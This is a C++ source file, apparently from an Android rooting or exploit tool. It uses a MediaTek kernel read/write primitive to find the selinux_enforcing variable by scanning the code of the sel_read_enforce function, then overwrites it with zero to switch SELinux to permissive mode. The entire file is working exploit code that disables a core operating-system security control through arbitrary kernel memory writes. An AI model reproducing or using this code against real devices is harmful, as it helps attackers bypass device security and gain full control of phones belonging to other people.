#include <stdio.h>

#include <iostream>
#include <memory>

#include "kallsyms.hpp"
#include "log.hpp"
#include "selinux.hpp"
#include "utils.hpp"

bool is_selinux_enforcing(bool& is_enforcing)
{
	const char* enforce_path = "/sys/fs/selinux/enforce";
	uint8_t enforcing_val = 0;

	FILE* enforce_file = fopen(enforce_path, "r");
	if (enforce_file == nullptr) {
		log_error("Failed to open SELinux enforce file: %s", strerror(errno));
		return false;
	}

	size_t bytes_read = fread(&enforcing_val, 1, sizeof(enforcing_val), enforce_file);
	if (bytes_read != sizeof(enforcing_val)) {
		log_error("Expected to read %d bytes but got %d", sizeof(enforcing_val), bytes_read);
		return false;
	}

	int ret = fclose(enforce_file);
	if (ret != 0) {
		log_error("Failed to close the SELinux enforce file: %s", strerror(errno));
		return false;
	}

	is_enforcing = enforcing_val == '1';

	return true;
}

bool set_selinux_permissive(MTKSu& kern_rw, std::map<std::string, uint64_t>& symbol_table)
{
	std::string sel_read_enforce = "tsel_read_enforce";
	uint64_t sel_read_enforce_addr = 0;

	try {
		sel_read_enforce_addr = symbol_table.at(sel_read_enforce);
	} catch (std::out_of_range e) {
		log_error("Could not find the %s kernel symbol", sel_read_enforce.c_str());
		return false;
	}
	log_info("Found sel_read_enforce at 0x%" PRIx64, sel_read_enforce_addr);

	const uint64_t read_buf_size = 0x400;
	auto read_buf = std::make_unique<std::vector<uint8_t>>();
	auto success = kern_rw.read(sel_read_enforce_addr, read_buf_size, read_buf);
	if (!success) {
		log_error("Failed to read sel_read_enforce_addr function");
		return false;
	}

	// 32-bit kernels only
	const uint64_t selinux_enforcing_buf_size = get_kern_ptr_size();
	auto selinux_enforcing_buf = std::make_unique<std::vector<uint8_t>>();

	// Most ARM instructions start with 0xeXXXXXXX. This will be used to filter out the instructions so we can
	// find a pointer value.
	const uint32_t arm_instr_min_val = 0xe0000000;
	// 32-bit kernels only
	for (uint32_t scan_itr = 0; scan_itr < read_buf_size; scan_itr += get_kern_ptr_size()) {
		uint32_t scan_val = *(uint32_t*)(read_buf->data() + scan_itr);

		if (scan_val > arm_instr_min_val) {
			continue;
		}
		if (!is_kernel_address(scan_val)) {
			continue;
		}

		log_info("Found possible address of selinux_enforcing: %" PRIx64, (uint64_t)scan_val);

		selinux_enforcing_buf->clear();
		success = kern_rw.read(scan_val, selinux_enforcing_buf_size, selinux_enforcing_buf);
		if (!success) {
			log_error("Failed to possible selinux_enforcing variable");
			return false;
		}

		int selinux_enforcing = *(int*)selinux_enforcing_buf->data();
		log_info("Value: %d", selinux_enforcing);
		if (selinux_enforcing == 1) {
			uint64_t selinux_enforcing_ptr = scan_val;
			log_info("Found the selinux_enforcing pointer at address: %" PRIx64,
			         (uint64_t)sel_read_enforce_addr + scan_itr);

			// Overwriting the value to set it to permissive
			auto write_buf = std::make_unique<std::vector<uint8_t>>();
			write_buf->push_back(0);
			write_buf->push_back(0);
			write_buf->push_back(0);
			write_buf->push_back(0);
			success = kern_rw.write(selinux_enforcing_ptr, write_buf);
			if (!success) {
				log_error("Failed to set selinux_enforcing to permissive");
				return false;
			}
			return true;
		}
	}

	return false;
}
